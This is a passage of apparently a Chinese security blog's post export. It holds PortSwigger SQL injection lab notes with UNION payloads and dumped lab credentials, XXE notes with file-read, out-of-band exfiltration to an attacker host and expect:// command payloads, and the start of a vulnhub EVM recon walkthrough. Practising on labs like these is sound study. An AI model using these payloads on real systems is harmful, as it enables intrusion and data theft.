src=\"/2.png\"></p>\n<p>成功！完美</p>\n<p>这一次的主要关键点是对于数据库类型的判断，需要借助sqlmap来判断数据库类型以进行注入语句的选择</p>\n<h1 id=\"登录框sql注入绕过\"><a href=\"#登录框sql注入绕过\" class=\"headerlink\" title=\"登录框sql注入绕过\"></a>登录框sql注入绕过</h1><p>相比前面一关，这一关似乎没有了category的这个选项，也就是说我们需要从其他地方找注入点</p>\n<p>购物商品的id应该是注入不了，看这个靶场的标题，应该是登录框下的post注入，我们看到有一个MyAccount选项，看来就是这个了</p>\n<p>构造万能密码：<code>admin&#39; or 1=1 --+</code></p>\n<p>发现提示用户名名有问题，后来又看了好久也不知道问题在哪里。。就算是postgresql数据库也不应该出现问题</p>\n<p>看了以下官方给出的solution，原来这里的用户名是administrator！</p>\n<p>因此我们的万能密码应该是<code>administratror&#39; or 1=1--</code></p>\n<p>这里又抱着尝试的心理想试试看<code>&#39; or 1=1--+</code>这个万能密码可不可以用，结果发现是可以的！</p>\n<h1 id=\"orancle注入\"><a href=\"#orancle注入\" class=\"headerlink\" title=\"orancle注入\"></a>orancle注入</h1><p>这一关提示是orancle数据库了</p>\n<ol>\n<li><p>判断闭合—&gt;单引号，和MySQL一样</p>\n</li>\n<li><p>判断字字段数—&gt;2，和MySQL一样</p>\n</li>\n<li><p>注出回显点</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span>Pets<span class=\"hljs-string\">&#x27; union all select &#x27;</span>null1<span class=\"hljs-string\">&#x27;,&#x27;</span>null2<span class=\"hljs-string\">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>\n\n<p>两个都是字符类型的并且都有回显</p>\n</li>\n<li><p>获取用户名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span>Gifts<span class=\"hljs-string\">&#x27; union all select user,&#x27;</span>null114514<span class=\"hljs-string\">&#x27; from dual--+</span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>通过用户名获取全部表名，这个是最高效的</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">-</span>Gifts<span class=\"hljs-string\">&#x27; union select (select LISTAGG(table_name,&#x27;</span>,<span class=\"hljs-string\">&#x27;)within group(order by owner)name from all_tables where owner=&#x27;</span>PETER<span class=\"hljs-string\">&#x27;),&#x27;</span>null114514<span class=\"hljs-string\">&#x27; from dual --</span><br></code></pre></td></tr></table></figure>\n\n<p>法二</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">-</span>Gifts<span class=\"hljs-string\">&#x27; union select table_name,&#x27;</span>null114514<span class=\"hljs-string\">&#x27; from user_tables where rownum=1 --</span><br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取表中的列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">-</span>Gifts<span class=\"hljs-string\">&#x27; union select (column_name),&#x27;</span>null114514<span class=\"hljs-string\">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class=\"hljs-string\">&#x27; --</span><br></code></pre></td></tr></table></figure>\n\n<p>然后用获取到的列名一步一步往下推</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">-</span>Gifts<span class=\"hljs-string\">&#x27; union select (column_name),&#x27;</span>null114514<span class=\"hljs-string\">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class=\"hljs-string\">&#x27;--</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">-</span>Gifts<span class=\"hljs-string\">&#x27; union select (column_name),&#x27;</span>null114514<span class=\"hljs-string\">&#x27; from user_tab_columns where rownum=1 and table_name =&#x27;</span>PRODUCTS<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>ID<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>CATEGORY<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>NAME<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>RATING<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>PRICE<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>IMAGE<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>RELEASED<span class=\"hljs-string\">&#x27; and column_name&lt;&gt;&#x27;</span>DESCRIPTION<span class=\"hljs-string\">&#x27;--</span><br></code></pre></td></tr></table></figure>\n\n<p>到这一步没有更多的回显了就是没有更多的列名了</p>\n</li>\n<li><p>dump全部内容</p>\n<p>postgresql没有MySQL那样方便的group_concat()函数，只能一步一步的自己手动推</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><code class=\"hljs sql\">?category<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">-</span>Gifts<span class=\"hljs-string\">&#x27; union select DESCRIPTION,&#x27;</span>null114514<span class=\"hljs-string\">&#x27; from PRODUCTS --</span><br></code></pre></td></tr></table></figure></li>\n</ol>\n<hr>\n<p>至此，这个靶场完美结束！</p>\n<h1 id=\"mysql注入\"><a href=\"#mysql注入\" class=\"headerlink\" title=\"mysql注入\"></a>mysql注入</h1><p>MySQL数据库是吧，，，五分钟拿下！</p>\n<ol>\n<li><p>判断闭合 单引号</p>\n</li>\n<li><p>判断字段数 2</p>\n</li>\n<li><p>注出回显点 1 2都是回显点</p>\n</li>\n<li><p>获取数据库内表名 <code>products</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">?category=--Pets&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取表名内列名 <code>category,description,id,image,name,price,rating,released</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">?category=--Pets&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;products&#x27;--+<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取全部数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">?category=--Pets&#x27; union select 1,group_concat(category,description,id,image,name,price,rating,released) from products--+<br></code></pre></td></tr></table></figure></li>\n</ol>\n<hr>\n<p>到这一步，已经结束了，总共耗时5分钟，但是出来以后看靶场依旧显示没有通关？</p>\n<p>回靶场又看了看，发现顶部有一个提示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">Make the database retrieve the string: &#x27;8.0.33-0ubuntu0.20.04.2&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>那就是把payload换成这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs mysql\">?category=-Pets&#x27; union select 1,&#x27;8.0.33-0ubuntu0.20.04.2&#x27;--+<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"postgresql注入2\"><a href=\"#postgresql注入2\" class=\"headerlink\" title=\"postgresql注入2\"></a>postgresql注入2</h1><p>这一关新出现了一个登录框，看来这一关是需要bypass login</p>\n<p>这一关的题目描述告诉我们应该先获取到数据库中的表中内容，然后就可以使用数据库中的表的内容成功登录，因此我们先使用第一关的注入方式重新注入一遍</p>\n<p>步骤就省略了，总之，最后的一步的payload是：</p>\n<figure class=\"highlight postgresql\"><table><tr><td class=\"code\"><pre><code class=\"hljs postgresql\">?category=-Gifts<span class=\"hljs-string\">&#x27; union select username_ucniul,password_yzwmyg from users_ckreei --+</span><br></code></pre></td></tr></table></figure>\n\n<p>得到的数据就包含了我们需要的用户和密码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">administrator<br>\tdl98o3trorz7cskbaguh<br>carlos<br>\tqc4qisc9ndlsyjjs60nq<br>wiener<br>\t34gdu60zq3tp7stmej8n<br></code></pre></td></tr></table></figure>\n\n<p>最终，成功登录！</p>\n<blockquote>\n<p><a href=\"https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle\">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle</a></p>\n<p>（给自己留个参考资料）</p>\n</blockquote>\n<h1 id=\"orancle注入2\"><a href=\"#orancle注入2\" class=\"headerlink\" title=\"orancle注入2\"></a>orancle注入2</h1><p>和上面一关差不多，只是换了一个数据库类型</p>\n<p>前面的步骤直接略，最后获取到的内容：</p>\n<p>用户名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">administrator<br>\t2<br>carlos<br>\t2<br>wiener<br>\t2<br></code></pre></td></tr></table></figure>\n\n<p>密码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">2g8dqtbv9r0cek01r42y<br>\t2<br>2ohduxnb1fdr59afvpiq<br>\t2<br>ojqq1ah94210ymhe83k2<br>\t2<br></code></pre></td></tr></table></figure>\n\n<p>成功登录了，这个靶场也是完美结束了！</p>\n<h1 id=\"sql联合注入\"><a href=\"#sql联合注入\" class=\"headerlink\" title=\"sql联合注入\"></a>sql联合注入</h1><p>这一关毫无难度，我在测试数据库类型的时候就直接通关了，通关payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?category=-Pets&#x27; union all select null,null,null --+<br></code></pre></td></tr></table></figure>\n\n<p>猜测是postgresql数据库类型</p>\n<h1 id=\"sql联合注入2\"><a href=\"#sql联合注入2\" class=\"headerlink\" title=\"sql联合注入2\"></a>sql联合注入2</h1><p>这一干也和上面一关一样，只是需要你找到其中的字符型回显位并输入指定的内容，只要数据库接受到了这个指定的字符，就通关了，具体的试数据类型可以看上面的postgresql注入</p>\n<p>paylaod：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?category=Pets&#x27; union all select null,&#x27;MsJjXo&#x27;,null--+<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"sql联合注入3\"><a href=\"#sql联合注入3\" class=\"headerlink\" title=\"sql联合注入3\"></a>sql联合注入3</h1><p>同上面的章节《postgresql注入2》</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?category=-Pets&#x27; union all select username,password from users--+<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"sql联合注入4\"><a href=\"#sql联合注入4\" class=\"headerlink\" title=\"sql联合注入4\"></a>sql联合注入4</h1><p>这一关和上面一关唯一的不同就是这一关的回显位置从1 2 都是变成了只有2是回显位置</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?category=-Pets&#x27; union all select &#x27;1&#x27;,username||&#x27;:&#x27;||password from users--+<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"sql盲注\"><a href=\"#sql盲注\" class=\"headerlink\" title=\"sql盲注\"></a>sql盲注</h1><p>盲注的靶场全部跳过，直接去看官方给出的writeup吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">靶场Blind SQL injection with conditional responses的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses<br><br>靶场Blind SQL injection with conditional errors的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>\n\n<p>后面的很多靶场略，都在<a href=\"https://portswigger.net/web-security/all-labs\">https://portswigger.net/web-security/all-labs</a></p>\n<h1 id=\"sql报错注入\"><a href=\"#sql报错注入\" class=\"headerlink\" title=\"sql报错注入\"></a>sql报错注入</h1><p>报错注入也同样跳过吧，暂时用不到</p>\n<p>如果遇到了那么bp官方的wt就是非常详细了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">靶场Visible error-based SQL injection的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based<br><br>靶场Blind SQL injection with conditional errors的wt：<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>这篇文章仅仅只是记录了sql注入的部分，剩下的靶场都已经在其他的靶场学习过便不记录了</p>\n<p>这篇文章的主要内容就是MySQL之外的数据库类型的基本注入语句，给未来的我或为数不多的读者一个参考！</p>\n","categories":["Web"],"tags":["sql"]},{"title":"XXE注入学习笔记","url":"/2023/07/28/XXE%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<p>这篇文章记录xxe注入的基本学习</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Basic\"><a href=\"#Basic\" class=\"headerlink\" title=\"Basic\"></a>Basic</h1><p>xxe注入基于xml，与sql注入，xss注入原理大致相同</p>\n<p>因为xml用于数据传输和存储，所以其渗透实战中的主要作用是读取敏感文件，将黑盒渗透转换为白盒渗透</p>\n<hr>\n<p>接下来看一段极其简单的代码来理解一下xml，事实上他和html几乎一样，唯一的区别就是上面说的，xml用于数据传输和存储，而html用于数据的表示</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span>?&gt;</span>   <span class=\"hljs-comment\">&lt;!--这一行是可选的--&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Person</span>&gt;</span>                <span class=\"hljs-comment\">&lt;!--每一段xml代码有且只有一个根元素--&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Name</span>&gt;</span>Vincent<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">Name</span>&gt;</span>    <span class=\"hljs-comment\">&lt;!--大小写敏感,每个标签需要闭合--&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Age</span>&gt;</span>18<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">Age</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">Person</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>不需要作过多的解释，就是这么简单，剩下的可以到文章最后的视频里面去看</p>\n<h1 id=\"相关场景注入payload\"><a href=\"#相关场景注入payload\" class=\"headerlink\" title=\"相关场景注入payload\"></a>相关场景注入payload</h1><h2 id=\"有回显\"><a href=\"#有回显\" class=\"headerlink\" title=\"有回显\"></a>有回显</h2><p>这是一段简单的xxe注入代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml-dtd\">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///D://Desktop//1.txt&quot;&gt;]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure>\n\n<p>这一段代码读取<code>/etc/passwd</code>这个文件的内容，并将这些内容赋值给变量<code>xxe</code>然后在<code>&lt;description&gt;</code>标签内将这些内容回显出来</p>\n<h2 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h2><p>首先肯定是需要判断是否存在xxe漏洞</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml-dtd\">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.26:2333&quot;&gt;]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure>\n\n<p>这一段代码访问了<code>http://192.168.1.26:2333</code></p>\n<p>假如攻击者的服务器是<code>http://192.168.1.26:2333</code>这个网站的功能是可以检测到有什么人访问了网站，如果上传了这一段恶意xml代码之后服务器显示有人访问，说明存在xxe漏洞</p>\n<p>判断存在漏洞之后就是要获取回显的数据了</p>\n<p>攻击者首先将需要执行的恶意代码放到他们的服务器上，然后让程序去访问并执行这个文件，程序执行后会将回显发给攻击者的服务器</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml-dtd\">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ELEMENT root ANY &gt;<br>&lt;!ENTITY % test SYSTEM &quot;http://192.168.1.26/1.xml&quot;&gt;<br>%test; <br>%exe;<br>]&gt;<br>&lt;root&gt;&amp;exfil;&lt;/root&gt;<br></code></pre></td></tr></table></figure>\n\n<p>xml文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml-dtd\">&lt;!ENTITY % data SYSTEM &quot;D:/Desktop/1.txt&quot;&gt;<br>&lt;!ENTITY % exe &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://192.168.1.26:2333/%data;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>\n\n<p>这样服务器就可以在2333端口获取到1.txt的内容了，但是，如果文件中含有中文字符就不会回显，这可能是编码的问题，因此我们需要对其编码，修改后的xml文件如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml-dtd\">&lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/Desktop/1.txt&quot;&gt;<br>&lt;!ENTITY % exe &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://192.168.1.26:2333/%data;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h2><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;<br>&lt;x&gt;&amp;xxe;&lt;/x&gt;<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h1><p>编码，混淆，加密…….</p>\n<h1 id=\"打靶实战\"><a href=\"#打靶实战\" class=\"headerlink\" title=\"打靶实战\"></a>打靶实战</h1><p>靶场：<code>https://github.com/c0ny1/xxe-lab</code></p>\n<p>你万万想象不到他的题目竟然只有一道，还是一个登录框。。。</p>\n<p>ok，直接抓包看报文</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">POST /xxe/doLogin.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: application/xml, text/xml, */*; q=0.01<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/xml;charset=utf-8<br>X-Requested-With: XMLHttpRequest<br>Content-Length: 63<br>Origin: http://127.0.0.1<br>Connection: close<br>Referer: http://127.0.0.1/xxe/<br>Cookie: security_level=0; PHPSESSID=t23tjsmud0qc26k105h4agbjr0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br><br>&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>\n\n<p>可以看到，最后一行很明显是一个xml的内容，并且存在用户名处的回显，因此我们构造注入语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">file:///D://Desktop//1.txt<br></code></pre></td></tr></table></figure>\n\n<p>也就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml-dtd\">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///D://Desktop//1.txt&quot;&gt;]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>\n\n<p>bp发包，可以看到已经回显出了文件的内容</p>\n<hr>\n<p>使用盲注的方式再来做一遍巩固一下，现在的payload是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs xml-dtd\">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ELEMENT root ANY &gt;<br>&lt;!ENTITY % test SYSTEM &quot;http://192.168.1.26/1.xml&quot;&gt;<br>%test; <br>%exe;<br>]&gt;<br>&lt;user&gt;&lt;username&gt;&amp;exfil;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure>\n\n<p>xml文件内容就在上面《无回显》章节</p>\n<p>bp发包，成功接收到b64编码后的内容，完美结束！</p>\n<blockquote>\n<p><a href=\"https://www.bilibili.com/video/BV1at41177SA/?spm_id_from=333.337.search-card.all.click&vd_source=1c43bcf31e4abf33f3960dd414786c92\">WEB安全漏洞介绍-XML外部实体注入攻击（XXE)</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1Hh411C7oT/?spm_id_from=333.337.search-card.all.click\">XXE漏洞讲解,如何判断XXE,通俗理解XXE</a></p>\n<p><a href=\"https://note.youdao.com/ynoteshare/index.html?id=b41700dbd75216812521ad5179e7291b&type=note&_time=1690534906767\">https://note.youdao.com/ynoteshare/index.html?id=b41700dbd75216812521ad5179e7291b&amp;type=note&amp;_time=1690534906767</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/177979.html\">XXE漏洞利用技巧：从XML到远程代码执行</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1e64y1M7E1/?spm_id_from=333.337.search-card.all.click&vd_source=1c43bcf31e4abf33f3960dd414786c92\">【ctf】【web】【xxe】SVG与盲xxe你会玩吗？</a>    (这个视频真的帮助很大)</p>\n<p><a href=\"https://blog.csdn.net/weixin_43749601/article/details/115330101\">XML外部实体注入；XXE漏洞；XXE有回显注入；XXE无回显注入；Blind XXE；绕过方式总结</a></p>\n</blockquote>\n","categories":["Web"],"tags":["xxe"]},{"title":"vulnhub_EVM","url":"/2023/08/12/vulnhub-EVM/","content":"<p>此文章记录渗透实战打靶，vlunhub的evm靶机</p>\n<span id=\"more\"></span>\n\n<h1 id=\"1-信息收集\"><a href=\"#1-信息收集\" class=\"headerlink\" title=\"1 信息收集\"></a>1 信息收集</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">┌──(root㉿kali)-[~]<br>└─# arp-scan -l<br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:a7:c2:f0, IPv4: 192.168.227.132<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.227.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.227.2   00:50:56:fd:06:ab       VMware, Inc.<br>192.168.227.136 00:0c:29:e4:12:d2       VMware, Inc.<br>192.168.227.254 00:50:56:eb:ad:6a       VMware, Inc.<br></code></pre></td></tr></table></figure>\n\n<p>靶机是192.168.227.136</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">ports=$(nmap -p- -sS -n --min-rate=8000 -T4 192.168.227.136 | grep -oE &#x27;(^[0-9][^/tcp]*)&#x27; | tr &#x27;\\n&#x27; &#x27;,&#x27;)<br></code></pre></td></tr></table></figure>\n\n<p>开放端口扫描：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">┌──(root㉿kali)-[~]<br>└─# echo $ports<br>22,53,80,110,139,143,445,<br></code></pre></td></tr></table></figure>\n\n<p>接着对端口进行服务探测：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">nmap -p$ports -sV -sC -O 192.168.227.136 -oN ./nmap/nmap_ports<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   2048 a2d3341362b118a3dddb35c55ab7c078 (RSA)<br>|   256 8548532a50c5a0b71aeea4d8128e1cce (ECDSA)<br>|_  256 362292c73222e33451bc0e749f1cdbaa (ED25519)<br>53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>| dns-nsid:<br>|_  bind.version: 9.10.3-P4-Ubuntu<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: SASL TOP PIPELINING UIDL AUTH-RESP-CODE CAPA RESP-CODES<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: Pre-login LOGINDISABLEDA0001 OK LITERAL+ post-login IMAP4rev1 SASL-IR have more IDLE ENABLE ID LOGIN-REFERRALS listed capabilities<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>MAC Address: 00:0C:29:E4:12:D2 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb2-security-mode:<br>|   311:<br>|_    Message signing enabled but not required<br>| smb2-time:<br>|   date: 2023-08-12T06:49:03<br>|_  start_date: N/A<br>| smb-os-discovery:<br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine<br>|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\\x00<br>|   Domain name: \\x00<br>|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine<br>|_  System time: 2023-08-12T02:49:03-04:00<br></code></pre></td></tr></table></figure>\n\n<p>接下来使用另一个工具进行扫描：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">enum4linux -a 192.168.227.136<br></code></pre></td></tr></table></figure>\n\n<p>没有什么有用的信息，然后使用searchsploit对samba和isc进行漏洞搜索，发现并没有什么东西，打开web看看</p>\n<p>是apache的初始页面，但是有一个提示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">you can find me at /wordpress/ im vulnerable webapp :) <br></code></pre></td></tr></table></figure>\n\n<p>访问192.168.227.136&#x2F;wordpress&#x2F;访问耗费了很长的时间，不知道为什么，直接上工具扫描吧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">wpscan --url http://192.168.227.136/wordpress -e u<br></code></pre></td></tr></table></figure>\n\n<p>枚举用户</p>\n<hr>\n<p>与此同时开始爆破目录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">dirsearch -u &quot;http://192.168.227.136/&quot; -x 403<br></code></pre></td></tr></table></figure>\n\n<p>扫到了这些：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">[03:08:42] Starting:<br>[03:09:00] 200 -   11KB - /index.html<br>[03:09:01] 200 -   82KB - /info.php<br>[03:09:15] 500 -    0B  - /wp-config.php<br>[03:09:20] 200 -    3KB - /wordpress/wp-login.php<br>[03:09:20] 